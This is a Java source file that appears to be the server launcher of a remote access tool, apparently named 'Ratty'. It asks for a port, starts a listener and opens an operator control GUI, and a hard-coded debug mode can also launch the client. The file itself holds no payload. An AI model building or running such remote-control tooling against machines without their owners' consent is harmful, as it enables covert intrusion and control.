package de.sogomn.rat;

import static de.sogomn.rat.util.Constants.LANGUAGE;

import javax.swing.JOptionPane;

import de.sogomn.rat.gui.server.RattyGui;
import de.sogomn.rat.gui.server.RattyGuiController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.Constants;

public final class Server {
	
	private static final boolean DEBUG = true;
	
	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
	
	private Server() {
		//...
	}
	
	private static void startDebug() {
		final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
		final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
		
		if (input == JOptionPane.YES_OPTION) {
			System.out.println(DEBUG_SERVER);
			
			Constants.setNimbusLookAndFeel();
			startServer(Constants.PORT);
		} else if (input == JOptionPane.NO_OPTION) {
			System.out.println(DEBUG_CLIENT);
			
			Client.startClient(Constants.ADDRESS, Constants.PORT);
		}
	}
	
	private static void startServer() {
		Constants.setNimbusLookAndFeel();
		
		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
		
		if (input == null) {
			return;
		}
		
		final int port = Integer.parseInt(input);
		
		if (port != -1) {
			startServer(port);
		} else {
			JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE, null, JOptionPane.ERROR_MESSAGE);
		}
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGui gui = new RattyGui();
		final RattyGuiController controller = new RattyGuiController(server, gui);
		
		gui.addListener(controller);
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		if (DEBUG) {
			startDebug();
		} else {
			startServer();
		}
	}
	
}
